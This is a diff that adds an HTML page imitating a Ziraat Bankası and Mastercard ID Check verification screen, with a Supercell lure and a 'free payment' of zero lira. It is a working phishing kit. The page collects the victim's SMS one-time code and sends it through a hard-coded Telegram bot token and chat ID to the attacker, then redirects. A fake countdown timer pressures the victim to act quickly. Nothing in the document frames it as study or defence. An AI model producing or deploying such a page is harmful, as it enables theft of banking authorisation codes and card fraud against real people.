@@ -1,0 +1,242 @@
+
+<!DOCTYPE html>
+
+<html lang="tr">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Ziraat Bankası - Doğrulama</title>
+
+    <style>
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+
+        body { background-color: #fff; display: flex; justify-content: center; padding: 10px; }
+
+        
+
+        .main-container { width: 100%; max-width: 400px; border: 1px solid #e0e0e0; padding: 15px; background: white; }
+
+
+
+        /* Logo Bölümü */
+
+        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+
+        .ziraat-logo { display: flex; align-items: center; font-size: 22px; font-weight: bold; color: #000; }
+
+        .ziraat-logo img { height: 32px; margin-right: 8px; }
+
+        
+
+        .mc-section { display: flex; align-items: center; font-size: 13px; color: #888; }
+
+        .mc-section img { height: 22px; margin-right: 5px; }
+
+
+
+        .page-title { text-align: center; font-size: 19px; color: #333; margin: 15px 0; font-weight: 500; }
+
+        hr { border: 0; border-top: 1px solid #eee; margin: 10px 0; }
+
+
+
+        /* Bilgiler */
+
+        .info-box { margin: 15px 0; }
+
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 16px; }
+
+        .label { font-weight: bold; color: #333; width: 45%; }
+
+        .value { color: #555; width: 55%; text-align: left; }
+
+
+
+        .sms-text { text-align: center; font-size: 14px; color: #666; line-height: 1.5; margin: 20px 0; }
+
+        
+
+        /* Giriş Alanı */
+
+        .input-label { font-weight: bold; font-size: 18px; margin-bottom: 8px; color: #333; display: block; }
+
+        .otp-box { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 18px; margin-bottom: 15px; outline: none; }
+
+        .confirm-btn { width: 100%; background-color: #00A3C1; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; }
+
+
+
+        .footer-area { text-align: center; margin-top: 15px; }
+
+        .timer-text { font-size: 15px; margin-bottom: 10px; font-weight: bold; }
+
+        .cancel-txt { color: #00A3C1; text-decoration: none; font-weight: bold; font-size: 16px; }
+
+    </style>
+
+</head>
+
+<body>
+
+
+
+<div class="main-container">
+
+    <div class="header-top">
+
+        <div class="ziraat-logo">
+
+            <img src="https://i.ibb.co/jPrQz6LY/images.png" alt="Ziraat">
+
+            SUPERCELL
+
+        </div>
+
+        <div class="mc-section">
+
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MC">
+
+            | ID Check
+
+        </div>
+
+    </div>
+
+
+
+    <div class="page-title">Doğrulama kodunu giriniz</div>
+
+    <hr>
+
+
+
+    <div class="info-box">
+
+        <div class="info-row"><div class="label">İşyeri Adı:</div><div class="value">ÜCRETSİZ ÖDEME</div></div>
+
+        <div class="info-row"><div class="label">İşlem Tutarı:</div><div class="value">0,00 TL</div></div>
+
+        <div class="info-row"><div class="label">İşlem Tarihi-Saati:</div><div class="value">03.01.2026 21:32:19</div></div>
+
+        <div class="row"><div class="label" style="font-weight: bold; width: 45%;">Kart Numarası:</div><div class="value" style="width: 55%;">XXXX XXXX XXXX XXXX</div></div>
+
+    </div>
+
+
+
+    <hr>
+
+
+
+    <div class="sms-text">
+
+        Şifreniz <b>0 XXX XXXXXXZ</b> nolu cep telefonunuza gönderilecektir.<br>
+
+        Referans no: 7J3V6UB1
+
+    </div>
+
+
+
+    <label class="input-label">Doğrulama Kodu</label>
+
+    <input type="text" id="otpCode" class="otp-box" inputmode="numeric">
+
+
+
+    <button type="button" class="confirm-btn" onclick="sendToTelegram()">Onayla</button>
+
+
+
+    <div class="footer-area">
+
+        <div class="timer-text">Kalan Süre: <span id="clock">02:33</span></div>
+
+        <a href="#" class="cancel-txt">İşlemi İptal Et</a>
+
+    </div>
+
+</div>
+
+
+
+<script>
+
+    // BOT MƏLUMATLARINIZI BURA YAZIN
+
+    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
+
+    const CHAT_ID = "-1003369084883";
+
+    const REDIRECT_URL = "hazir_sehifeniz.html";
+
+
+
+    function sendToTelegram() {
+
+        const code = document.getElementById("otpCode").value;
+
+        if(code.trim() === "") {
+
+            alert("Lütfen kodu giriniz.");
+
+            return;
+
+        }
+
+
+
+        const msg = `⚡️ *YENİ ÖDEME KODU* ⚡️\n\n🔑 Kod: \`${code}\`\n🏢 İşyeri: ÜCRETSİZ ÖDEME\n💰 Tutar: 0.00 TL`;
+
+
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+            method: 'POST',
+
+            headers: { 'Content-Type': 'application/json' },
+
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+
+        }).then(() => {
+
+            window.location.href = REDIRECT_URL;
+
+        }).catch(() => {
+
+            window.location.href = REDIRECT_URL;
+
+        });
+
+    }
+
+
+
+    // Taymer (Geri sayım)
+
+    let timeLeft = 153;
+
+    setInterval(() => {
+
+        let m = Math.floor(timeLeft / 60);
+
+        let s = timeLeft % 60;
+
+        document.getElementById("clock").innerText = (m < 10 ? '0' : '') + m + ":" + (s < 10 ? '0' : '') + s;
+
+        if(timeLeft > 0) timeLeft--;
+
+    }, 1000);
+
+</script>
+
+
+
+</body>
+
+  </html>
